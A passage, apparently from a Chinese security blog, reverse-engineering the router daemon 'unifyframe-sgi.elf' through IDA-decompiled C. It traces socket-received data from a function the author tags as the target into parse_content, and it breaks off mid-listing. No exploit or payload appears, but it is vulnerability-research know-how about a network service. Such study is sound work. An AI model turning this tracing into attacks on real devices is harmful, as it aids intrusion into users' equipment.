uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)open debug mode!&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;main&quot;</span>, <span class="number">1566</span>);</span><br><span class="line">      g_debug = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v13 == <span class="number">104</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;unifyframe-sgi.elf:&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;-h : show help message &quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;-d: open debug mode&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_98;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  sem_init(&amp;unk_435E3C, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  openlog(<span class="string">&quot;unifyframe-sgi&quot;</span>, <span class="number">3</span>, <span class="number">8</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !ufm_init() )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( uf_ubus_init() )</span><br><span class="line">    &#123;</span><br><span class="line">      uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)uf_ubus_init failed!&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;main&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v43[<span class="number">1</span>] = (<span class="type">int</span>)handle_pipe;</span><br><span class="line">    sigemptyset(&amp;v43[<span class="number">2</span>]);</span><br><span class="line">    v43[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    sigaction(<span class="number">13</span>, v43, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( sgi_mgr_init(&amp;g_sgi_client_mgr) &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v14 = uf_socket_server_init(<span class="number">20</span>);</span><br><span class="line">      v15 = v14;</span><br><span class="line">      <span class="keyword">if</span> ( v14 &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( uf_cmd_task_init() )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_98;</span><br><span class="line">        <span class="keyword">if</span> ( uf_create_detached_thread(v48, sub_405418, <span class="number">0</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          v16 = <span class="number">1608</span>;</span><br><span class="line">LABEL_27:</span><br><span class="line">          uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)create thread failed!&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;main&quot;</span>, v16);</span><br><span class="line">          <span class="keyword">goto</span> LABEL_98;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( uf_create_detached_thread(v47, sub_40715C, <span class="number">0</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          v16 = <span class="number">1613</span>;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( g_debug &gt;= <span class="number">2</span> )</span><br><span class="line">          uf_log_printf(uf_log, <span class="string">&quot;(%s %s %d)init ok&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;main&quot;</span>, <span class="number">1617</span>);</span><br><span class="line">        signal(<span class="number">18</span>, handler);</span><br><span class="line">        uf_redirect();</span><br><span class="line">        v52 = <span class="number">1</span> &lt;&lt; v15;</span><br><span class="line">        v54 = <span class="number">4</span> * ((<span class="type">unsigned</span> <span class="type">int</span>)v15 &gt;&gt; <span class="number">5</span>);</span><br><span class="line">        v55 = &amp;g_fd_set[v54 / <span class="number">4</span>];</span><br><span class="line">        v17 = v15 &lt; <span class="number">0</span>;</span><br><span class="line">LABEL_31:</span><br><span class="line">        v18 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( !v17 )</span><br><span class="line">          v18 = v15;</span><br><span class="line">        i = v18;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          v19 = g_fd_set;</span><br><span class="line">          <span class="keyword">do</span></span><br><span class="line">            *v19++ = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">while</span> ( v19 != (<span class="type">int</span> *)&amp;g_test_mutex );</span><br><span class="line">          *v55 |= v52;</span><br><span class="line">          fbss = i;</span><br><span class="line">          pthread_mutex_lock(&amp;unk_436370);</span><br><span class="line">          v20 = (<span class="type">int</span> *)(dword_436364 - <span class="number">12</span>);</span><br><span class="line">          v21 = *(_DWORD *)dword_436364 - <span class="number">12</span>;</span><br><span class="line">          <span class="keyword">while</span> ( v20 + <span class="number">3</span> != &amp;dword_436364 )</span><br><span class="line">          &#123;</span><br><span class="line">            pthread_mutex_lock(v20 + <span class="number">5</span>);</span><br><span class="line">            <span class="keyword">if</span> ( *v20 != <span class="number">-1</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              g_fd_set[(<span class="type">unsigned</span> <span class="type">int</span>)*v20 &gt;&gt; <span class="number">5</span>] |= <span class="number">1</span> &lt;&lt; *v20;</span><br><span class="line">              v22 = *v20;</span><br><span class="line">              <span class="keyword">if</span> ( fbss &gt;= *v20 )</span><br><span class="line">                v22 = fbss;</span><br><span class="line">              fbss = v22;</span><br><span class="line">            &#125;</span><br><span class="line">            pthread_mutex_unlock(v20 + <span class="number">5</span>);</span><br><span class="line">            v20 = (<span class="type">int</span> *)v21;</span><br><span class="line">            v21 = *(_DWORD *)(v21 + <span class="number">12</span>) - <span class="number">12</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          pthread_mutex_unlock(&amp;unk_436370);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( select(fbss + <span class="number">1</span>, g_fd_set, <span class="number">0</span>, <span class="number">0</span>) &lt;= <span class="number">0</span> );</span><br><span class="line">        <span class="keyword">if</span> ( (v52 &amp; g_fd_set[v54 / <span class="number">4</span>]) == <span class="number">0</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_58;</span><br><span class="line">        <span class="keyword">if</span> ( g_sgi_client_mgr &gt;= <span class="number">100</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)connect is full %d\n&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;main&quot;</span>, <span class="number">1646</span>, v15);</span><br><span class="line">          sleep(<span class="number">1</span>);</span><br><span class="line">          <span class="keyword">goto</span> LABEL_94;</span><br><span class="line">        &#125;</span><br><span class="line">        v23 = accept(v15, v43, v44);</span><br><span class="line">        v24 = v23;</span><br><span class="line">        <span class="keyword">if</span> ( v23 &lt; <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( g_debug &gt;= <span class="number">3</span> )</span><br><span class="line">            uf_log_printf(uf_log, <span class="string">&quot;(%s %s %d)accept a client filed![%d]&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;sgi_accept_client&quot;</span>, <span class="number">1391</span>, v23);</span><br><span class="line">          <span class="keyword">goto</span> LABEL_58;</span><br><span class="line">        &#125;</span><br><span class="line">        client = sgi_mgr_get_client(v23);</span><br><span class="line">        <span class="keyword">if</span> ( client )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( g_debug &gt;= <span class="number">3</span> )</span><br><span class="line">            uf_log_printf(uf_log, <span class="string">&quot;(%s %s %d)get a client from list %d&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;sgi_accept_client&quot;</span>, <span class="number">1397</span>, v24);</span><br><span class="line">          *(_DWORD *)(client + <span class="number">48</span>) = <span class="number">20</span>;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_58;</span><br><span class="line">        &#125;</span><br><span class="line">        v26 = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">52</span>);</span><br><span class="line">        v27 = (<span class="type">int</span> *)v26;</span><br><span class="line">        <span class="keyword">if</span> ( v26 )</span><br><span class="line">        &#123;</span><br><span class="line">          v28 = v26 + <span class="number">4</span>;</span><br><span class="line">          v27[<span class="number">2</span>] = v28;</span><br><span class="line">          v27[<span class="number">1</span>] = v28;</span><br><span class="line">          <span class="keyword">if</span> ( !pthread_mutex_init(v27 + <span class="number">5</span>, <span class="number">0</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            v27[<span class="number">11</span>] = <span class="number">0</span>;</span><br><span class="line">            *v27 = v24;</span><br><span class="line">            v27[<span class="number">12</span>] = <span class="number">20</span>;</span><br><span class="line">            ((<span class="type">void</span> (__fastcall *)(<span class="type">int</span> *))sgi_mgr_add_client)(v27);</span><br><span class="line">LABEL_58:</span><br><span class="line">            pthread_mutex_lock(&amp;unk_436370);</span><br><span class="line">            sock = (_DWORD *)(dword_436364 - <span class="number">12</span>);</span><br><span class="line">            <span class="keyword">for</span> ( i = *(_DWORD *)dword_436364 - <span class="number">12</span>; ; i = *(_DWORD *)(v30 + <span class="number">12</span>) - <span class="number">12</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">if</span> ( sock + <span class="number">3</span> == &amp;dword_436364 )</span><br><span class="line">              &#123;</span><br><span class="line">                pthread_mutex_unlock(&amp;unk_436370);</span><br><span class="line">LABEL_94:</span><br><span class="line">                v17 = v15 &lt; <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">goto</span> LABEL_31;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">if</span> ( *sock == <span class="number">-1</span> )</span><br><span class="line">                <span class="keyword">goto</span> LABEL_91;</span><br><span class="line">              v30 = i;</span><br><span class="line">              <span class="keyword">if</span> ( ((g_fd_set[*sock &gt;&gt; <span class="number">5</span>] &gt;&gt; *sock) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">                <span class="keyword">goto</span> LABEL_92;</span><br><span class="line">              <span class="keyword">if</span> ( g_pkg_cnt &lt; <span class="number">101</span> )</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">              uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)packet full!&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;client_recv_pkg&quot;</span>);</span><br><span class="line">LABEL_91:</span><br><span class="line">              v30 = i;</span><br><span class="line">LABEL_92:</span><br><span class="line">              sock = (_DWORD *)v30;</span><br><span class="line">            &#125;</span><br><span class="line">            addr = malloc_pkg();</span><br><span class="line">            <span class="keyword">if</span> ( !addr )</span><br><span class="line">            &#123;</span><br><span class="line">              uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)memory full!&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;client_recv_pkg&quot;</span>);</span><br><span class="line">              <span class="keyword">goto</span> LABEL_91;</span><br><span class="line">            &#125;</span><br><span class="line">            pthread_mutex_lock(sock + <span class="number">5</span>);       <span class="comment">// 上锁</span></span><br><span class="line">            *addr = sock;</span><br><span class="line">            aa = (_DWORD *)uf_socket_msg_read(*sock, addr + <span class="number">1</span>);<span class="comment">// ######################target####################</span></span><br><span class="line">            pthread_mutex_unlock(sock + <span class="number">5</span>);     <span class="comment">// 解锁</span></span><br><span class="line">            <span class="keyword">if</span> ( (<span class="type">int</span>)aa &lt;= <span class="number">0</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              sub_404A34(sock + <span class="number">3</span>);</span><br><span class="line">              <span class="keyword">if</span> ( g_sgi_client_mgr &gt; <span class="number">0</span> )</span><br><span class="line">                --g_sgi_client_mgr;</span><br><span class="line">              <span class="keyword">if</span> ( sub_405238(sock) )</span><br><span class="line">              &#123;</span><br><span class="line">                v32 = (_DWORD *)dword_436368;</span><br><span class="line">                dword_436368 = (<span class="type">int</span>)(sock + <span class="number">3</span>);</span><br><span class="line">                sock[<span class="number">4</span>] = v32;</span><br><span class="line">                sock[<span class="number">3</span>] = &amp;dword_436364;</span><br><span class="line">                *v32 = sock + <span class="number">3</span>;</span><br><span class="line">                ++g_sgi_client_mgr;</span><br><span class="line">              &#125;</span><br><span class="line">              v33 = addr[<span class="number">1</span>];</span><br><span class="line">              <span class="keyword">if</span> ( v33 )</span><br><span class="line">                <span class="built_in">free</span>(v33);</span><br><span class="line">LABEL_90:</span><br><span class="line">              <span class="built_in">free</span>(addr);</span><br><span class="line">              <span class="keyword">goto</span> LABEL_91;</span><br><span class="line">            &#125;</span><br><span class="line">            method = (<span class="type">const</span> <span class="type">char</span> *)addr[<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span> ( method )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">if</span> ( <span class="built_in">strstr</span>(addr[<span class="number">1</span>], <span class="string">&quot;.get&quot;</span>) )</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="keyword">if</span> ( g_debug &lt; <span class="number">3</span> )</span><br><span class="line">                  <span class="keyword">goto</span> LABEL_82;</span><br><span class="line">                v35 = <span class="built_in">strlen</span>(method);</span><br><span class="line">                v36 = <span class="number">735</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">              &#123;</span><br><span class="line">                <span class="keyword">if</span> ( g_debug &lt; <span class="number">2</span> )</span><br><span class="line">                  <span class="keyword">goto</span> LABEL_82;</span><br><span class="line">                v35 = <span class="built_in">strlen</span>(method);</span><br><span class="line">                v36 = <span class="number">733</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              uf_log_printf(</span><br><span class="line">                uf_log,</span><br><span class="line">                <span class="string">&quot;(%s %s %d)------[%x][%d][%d]package buf:%s&quot;</span>,</span><br><span class="line">                <span class="string">&quot;sgi.c&quot;</span>,</span><br><span class="line">                <span class="string">&quot;client_recv_pkg&quot;</span>,</span><br><span class="line">                v36,</span><br><span class="line">                addr,</span><br><span class="line">                *(_DWORD *)*addr,</span><br><span class="line">                v35,</span><br><span class="line">                method);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              uf_log_printf(</span><br><span class="line">                uf_log,</span><br><span class="line">                <span class="string">&quot;ERROR (%s %s %d)------[%x][%d]package buf is NULL!&quot;</span>,</span><br><span class="line">                <span class="string">&quot;sgi.c&quot;</span>,</span><br><span class="line">                <span class="string">&quot;client_recv_pkg&quot;</span>,</span><br><span class="line">                <span class="number">738</span>,</span><br><span class="line">                addr,</span><br><span class="line">                *(_DWORD *)*addr);</span><br><span class="line">            &#125;</span><br><span class="line">LABEL_82:</span><br><span class="line">            <span class="keyword">if</span> ( !parse_content((<span class="type">int</span>)addr) )</span><br><span class="line">            &#123;</span><br><span class="line">              pthread_mutex_lock(sock + <span class="number">5</span>);</span><br><span class="line">              v38 = (_DWORD *)sock[<span class="number">2</span>];</span><br><span class="line">              sock[<span class="number">2</span>] = addr + <span class="number">24</span>;</span><br><span class="line">              addr[<span class="number">24</span>] = sock + <span class="number">1</span>;</span><br><span class="line">              addr[<span class="number">25</span>] = v38;</span><br><span class="line">              *v38 = addr + <span class="number">24</span>;</span><br><span class="line">              sock[<span class="number">12</span>] = <span class="number">20</span>;</span><br><span class="line">              sock[<span class="number">11</span>] = <span class="number">0</span>;</span><br><span class="line">              pthread_mutex_unlock(sock + <span class="number">5</span>);</span><br><span class="line">              <span class="keyword">if</span> ( !add_pkg_cmd2_task(addr) )</span><br><span class="line">              &#123;</span><br><span class="line">                v30 = i;</span><br><span class="line">                <span class="keyword">goto</span> LABEL_92;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)recv package failed!&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;client_recv_pkg&quot;</span>, <span class="number">765</span>);</span><br><span class="line">            v37 = addr[<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span> ( v37 )</span><br><span class="line">              <span class="built_in">free</span>(v37);</span><br><span class="line">            v39 = (_DWORD *)addr[<span class="number">22</span>];</span><br><span class="line">            v40 = v39 - <span class="number">13</span>;</span><br><span class="line">            v41 = *v39 - <span class="number">52</span>;</span><br><span class="line">            aa = addr + <span class="number">22</span>;</span><br><span class="line">            <span class="keyword">while</span> ( v40 + <span class="number">13</span> != aa )</span><br><span class="line">            &#123;</span><br><span class="line">              sub_404A34(v40 + <span class="number">13</span>);</span><br><span class="line">              v42 = v40;</span><br><span class="line">              v40 = (_DWORD *)v41;</span><br><span class="line">              free_cmd(v42);</span><br><span class="line">              v41 = *(_DWORD *)(v41 + <span class="number">52</span>) - <span class="number">52</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_90;</span><br><span class="line">          &#125;</span><br><span class="line">          uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)failed to init mutex!&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;sgi_client_malloc&quot;</span>, <span class="number">1171</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)client malloc failed %d&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;sgi_accept_client&quot;</span>, <span class="number">1404</span>, v24);</span><br><span class="line">        close(v24);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_58;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v14 )</span><br><span class="line">      &#123;</span><br><span class="line">        unlink(<span class="string">&quot;/tmp/uniframe_sgi/unifyframe_sgi.sock&quot;</span>);</span><br><span class="line">        close(v15);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    pthread_mutex_destroy(&amp;unk_436370);</span><br><span class="line">LABEL_98:</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)ufm_ini failed!&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;main&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现一样的长，一样的震撼</p>
<p>但是前面基本没啥用只看read之后的部分</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">pthread_mutex_lock(sock + <span class="number">5</span>);       <span class="comment">// 上锁</span></span><br><span class="line">*addr = sock;</span><br><span class="line">aa = (_DWORD *)uf_socket_msg_read(*sock, addr + <span class="number">1</span>);<span class="comment">// ######################target####################</span></span><br><span class="line">pthread_mutex_unlock(sock + <span class="number">5</span>);     <span class="comment">// 解锁</span></span><br><span class="line"><span class="keyword">if</span> ( (<span class="type">int</span>)aa &lt;= <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">   .......</span><br><span class="line">&#125;</span><br><span class="line">method = (<span class="type">const</span> <span class="type">char</span> *)addr[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">if</span> ( method )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strstr</span>(addr[<span class="number">1</span>], <span class="string">&quot;.get&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( g_debug &lt; <span class="number">3</span> )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_82;</span><br><span class="line">        v35 = <span class="built_in">strlen</span>(method);</span><br><span class="line">        v36 = <span class="number">735</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( g_debug &lt; <span class="number">2</span> )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_82;</span><br><span class="line">        v35 = <span class="built_in">strlen</span>(method);</span><br><span class="line">        v36 = <span class="number">733</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    uf_log_printf(</span><br><span class="line">        uf_log,</span><br><span class="line">        <span class="string">&quot;(%s %s %d)------[%x][%d][%d]package buf:%s&quot;</span>,</span><br><span class="line">        <span class="string">&quot;sgi.c&quot;</span>,</span><br><span class="line">        <span class="string">&quot;client_recv_pkg&quot;</span>,</span><br><span class="line">        v36,</span><br><span class="line">        addr,</span><br><span class="line">        *(_DWORD *)*addr,</span><br><span class="line">        v35,</span><br><span class="line">        method);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    uf_log_printf(</span><br><span class="line">        uf_log,</span><br><span class="line">        <span class="string">&quot;ERROR (%s %s %d)------[%x][%d]package buf is NULL!&quot;</span>,</span><br><span class="line">        <span class="string">&quot;sgi.c&quot;</span>,</span><br><span class="line">        <span class="string">&quot;client_recv_pkg&quot;</span>,</span><br><span class="line">        <span class="number">738</span>,</span><br><span class="line">        addr,</span><br><span class="line">        *(_DWORD *)*addr);</span><br><span class="line">&#125;</span><br><span class="line">LABEL_82:</span><br><span class="line"><span class="keyword">if</span> ( !parse_content((<span class="type">int</span>)addr) )</span><br><span class="line">&#123;</span><br><span class="line">    pthread_mutex_lock(sock + <span class="number">5</span>);</span><br><span class="line">    v38 = (_DWORD *)sock[<span class="number">2</span>];</span><br><span class="line">    sock[<span class="number">2</span>] = addr + <span class="number">24</span>;</span><br><span class="line">    addr[<span class="number">24</span>] = sock + <span class="number">1</span>;</span><br><span class="line">    addr[<span class="number">25</span>] = v38;</span><br><span class="line">    *v38 = addr + <span class="number">24</span>;</span><br><span class="line">    sock[<span class="number">12</span>] = <span class="number">20</span>;</span><br><span class="line">    sock[<span class="number">11</span>] = <span class="number">0</span>;</span><br><span class="line">    pthread_mutex_unlock(sock + <span class="number">5</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !add_pkg_cmd2_task(addr) )</span><br><span class="line">    &#123;</span><br><span class="line">        v30 = i;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_92;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>read接收数据将数据放到addr上，之后</p>
<p>主要就是调用这个if</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !parse_content((<span class="type">int</span>)addr) )</span><br><span class="line">&#123;</span><br><span class="line">    pthread_mutex_lock(sock + <span class="number">5</span>);</span><br><span class="line">    v38 = (_DWORD *)sock[<span class="number">2</span>];</span><br><span class="line">    sock[<span class="number">2</span>] = addr + <span class="number">24</span>;</span><br><span class="line">    addr[<span class="number">24</span>] = sock + <span class="number">1</span>;</span><br><span class="line">    addr[<span class="number">25</span>] = v38;</span><br><span class="line">    *v38 = addr + <span class="number">24</span>;</span><br><span class="line">    sock[<span class="number">12</span>] = <span class="number">20</span>;</span><br><span class="line">    sock[<span class="number">11</span>] = <span class="number">0</span>;</span><br><span class="line">    pthread_mutex_unlock(sock + <span class="number">5</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !add_pkg_cmd2_task(addr) )</span><br><span class="line">    &#123;</span><br><span class="line">        v30 = i;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_92;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第一个函数parse_content</p>
<h4 id="parse-content"><a href="#parse-content" class="headerlink" title="parse_content"></a>parse_content</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">parse_content</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> json; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *<span class="built_in">string</span>; <span class="comment">// $s4</span></span><br><span class="line">  <span class="type">int</span> method_string; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// $s2</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// $s5</span></span><br><span class="line">  <span class="type">int</span> idx; <span class="comment">// $s6</span></span><br><span class="line">  <span class="type">int</span> *v12; <span class="comment">// $s3</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> *v14; <span class="comment">// $s2</span></span><br><span class="line">  <span class="type">int</span> addr; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// [sp+20h] [-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> device; <span class="comment">// [sp+24h] [-Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> params; <span class="comment">// [sp+28h] [-8h] BYREF</span></span><br><span class="line">  <span class="type">int</span> method; <span class="comment">// [sp+2Ch] [-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">598</span>;</span><br><span class="line">  <span 